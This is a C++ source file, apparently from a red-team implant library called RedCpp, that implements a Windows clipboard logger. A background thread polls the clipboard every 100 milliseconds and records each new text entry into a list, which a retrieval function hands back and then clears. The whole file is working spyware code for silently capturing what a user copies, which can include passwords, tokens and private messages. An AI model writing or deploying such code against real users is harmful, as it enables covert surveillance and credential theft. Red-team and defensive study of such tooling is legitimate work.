/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "clipboard.h"

ClipboardLogger* clipboard_logger = NULL;
std::mutex clipboard_logger_lock;
bool clipboard_thread_active = false;
std::list<std::string> logged = std::list<std::string>();

ClipboardLogger::ClipboardLogger()
{
    this->logged_clipboards = std::list<std::string>();
}

ClipboardLogger::~ClipboardLogger()
{
}

bool ClipboardLogger::start_clipboard_logger()
{
	clipboard_logger_lock.lock();

	if (clipboard_logger != NULL)
	{
		clipboard_logger_lock.unlock();
		return false;
	}

	clipboard_logger = this;

	HANDLE clipboard_logger_thread_handle = CreateThread(0, 0, clipboard_logger_thread, NULL, 0, NULL);

	clipboard_logger_lock.unlock();

	return true;
}

DWORD WINAPI clipboard_logger_thread(LPVOID lpParameter)
{
    /*
    * source: https://cplusplus.com/forum/lounge/27569/
    */

	clipboard_thread_active = true;

	while (true) {

		clipboard_logger_lock.lock();
		if (clipboard_logger == NULL)
		{
			clipboard_logger_lock.unlock();
			break;
		}
		clipboard_logger_lock.unlock();

		if (!OpenClipboard(NULL))
		{
#ifdef DEBUG
			//printf("Failed to open clipboard\n");
#endif
			continue;
		}

		HANDLE h_clipboard_data = GetClipboardData(CF_TEXT);
		if (h_clipboard_data == NULL)
		{
#ifdef DEBUG
			//printf("Failed to get clipboard data\n");
#endif
			CloseClipboard();

			continue;
		}

		char* clipboard_text = (char*)GlobalLock(h_clipboard_data);
		if (clipboard_text == NULL)
		{
#ifdef DEBUG
			printf("Failed to get clipboard text\n");
#endif
			GlobalUnlock(h_clipboard_data);
			CloseClipboard();

			continue;
		}

		clipboard_logger_lock.lock();

		std::string data_str = std::string(clipboard_text);

		std::string last_clipboard = "";
		if (!logged.empty())
			last_clipboard = logged.back();

		if (last_clipboard.compare(data_str) != 0)
		{
			logged.push_back(data_str);
		}

		clipboard_logger_lock.unlock();

		GlobalUnlock(h_clipboard_data);
		CloseClipboard();

		Sleep(100);
	}
	
	clipboard_thread_active = false;
	
	return 0;
}

bool ClipboardLogger::stop_clipboard_logger()
{
	clipboard_logger_lock.lock();

	if (clipboard_logger == NULL)
	{
		clipboard_logger_lock.unlock();
		return false;
	}

	clipboard_logger = NULL;
	clipboard_logger_lock.unlock();

	// Wait for thread to end
	while (clipboard_thread_active == true)
		Sleep(100);

	return true;
}

std::list<std::string> ClipboardLogger::get_logged_clipboards()
{
	clipboard_logger_lock.lock();

	if (clipboard_logger == NULL)
	{
		clipboard_logger_lock.unlock();
		return std::list<std::string>();
	}

	std::list<std::string> output = logged;
	logged = std::list<std::string>();

	clipboard_logger_lock.unlock();

	return output;
}
